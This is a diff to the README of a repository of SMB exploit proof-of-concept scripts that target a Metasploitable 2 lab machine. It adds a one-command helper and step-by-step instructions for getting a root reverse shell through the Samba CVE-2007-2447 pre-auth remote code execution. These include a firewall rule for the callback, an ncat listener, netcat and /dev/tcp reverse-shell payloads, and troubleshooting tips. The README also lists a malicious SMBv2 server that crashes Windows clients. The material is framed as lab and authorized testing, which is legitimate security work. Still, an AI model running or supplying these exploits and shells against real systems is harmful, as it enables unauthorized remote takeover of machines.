@@ -3,16 +3,13 @@
 Educational proof-of-concept scripts for SMB vulnerabilities. Authorized
 testing only — do not run against systems you do not own.
 
-## SMB exploit PoCs
-
-Educational proof-of-concept scripts for SMB vulnerabilities. Authorized
-testing only — do not run against systems you do not own.
-
 ## Repository layout
 
 ```
 cve-2007-2447/
   cve_2007_2447.py       Samba pre-auth RCE (works, verified)
+  reverse_shell.sh       One-command reverse shell helper (opens the firewall,
+                         picks the callback address, listens, fires the exploit)
 cve-2009-3103/
   cve_2009_3103_smbv2_server.py   Malicious SMBv2 server (crashes Windows clients)
 cve-2020-0796/
@@ -58,7 +55,7 @@ python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "uname -a && 
 # Use NetBIOS port 139 instead of 445
 python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --port 139 --cmd "id"
 
-# Reverse shell (start a listener first: nc -lvnp 4444)
+# Reverse shell — easiest is the helper, see "Getting a reverse shell" below
 python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444
 
 # Skip HTTP retrieval (command still runs; output stays on the target)
@@ -66,6 +63,70 @@ python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "id" --no-ver
 ```
 
 No third-party packages — standard library only (Python 3).
+
+## Getting a reverse shell (self-contained)
+
+The exploit already injects a shell — the only fiddly parts are the callback
+address, the local firewall, and the payload. All three are handled for you.
+
+### One command
+
+```bash
+# From the attacker host (Git Bash on Windows, or a Linux shell)
+./cve-2007-2447/reverse_shell.sh <target_ip> [lport] [lhost]
+
+# e.g.
+./cve-2007-2447/reverse_shell.sh 192.168.200.132
+```
+
+It opens the firewall for the callback port, picks a callback address on the
+target's subnet, starts the listener, then fires the exploit. You land in a
+root shell — try `id; hostname; uname -a`, type `exit` to drop it.
+
+### Manual equivalent
+
+```bash
+# 1. Open the local firewall for the callback port (Windows, as Administrator)
+netsh advfirewall firewall add rule name="revshell 4444" dir=in action=allow protocol=TCP localport=4444
+
+# 2. Listen — on the Windows host, NOT inside WSL (see note 1 below)
+"C:\Program Files (x86)\Nmap\ncat.exe" -l -v -p 4444
+
+# 3. In another terminal, fire the exploit at the target
+python3 cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444
+```
+
+### The three things that break it
+
+1. **Wrong callback address.** The `lhost` you pass must be reachable *from the
+   target*. If you run the exploit inside WSL, do not use the WSL address
+   (`172.x`) — WSL is NAT'd behind Windows and the target has no route to it.
+   Use the Windows adapter that shares the target's subnet (the VMware VMnet
+   address, e.g. `192.168.200.1`). `reverse_shell.sh` auto-detects this.
+2. **Firewall.** All Windows firewall profiles are on by default. Without an
+   inbound allow rule the target's callback is dropped silently and the
+   listener just sits there.
+3. **Payload.** The usual `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` does **not**
+   work on Metasploitable 2 — its bash (3.2.33) is built without net
+   redirections, so it dies with `No such file or directory`. The script uses
+   the target's own netcat instead: `nc LHOST LPORT -e /bin/bash &`.
+
+### If no shell arrives
+
+- `netstat -ano | grep :<lport>` — an ESTABLISHED line means the shell is
+  already there. A `TimeoutError` from the SMB session setup does **not** mean
+  failure: if the injected command blocks, Samba never replies.
+- Probe the route independently: run
+  `--cmd "echo test | nc -w 3 <lhost> <lport>"` and see whether it lands on the
+  listener. That separates firewall/route problems from payload problems.
+- Port busy or reserved? Pick another — `netsh int ipv4 show
+  excludedportrange protocol=tcp` lists Windows' reserved ranges.
+
+Remove the firewall rule when you are done:
+
+```bash
+netsh advfirewall firewall delete rule name="CVE-2007-2447 revshell <lport>"
+```
 
 ## cve-2009-3103/ — Windows SMBv2 client crash (NOT for Samba)
 
@@ -120,6 +181,8 @@ exploit.
 
 - Target: Metasploitable 2 at `192.168.200.132` (VMware, host-only/NAT)
 - Host: any machine on the same network with Python 3
+- Callback for reverse shells: the Windows adapter on the target's subnet
+  (`192.168.200.1`), **not** WSL's NAT address
 - Open ports on target: 22, 80, 139, 445, 3632
 
 ## License
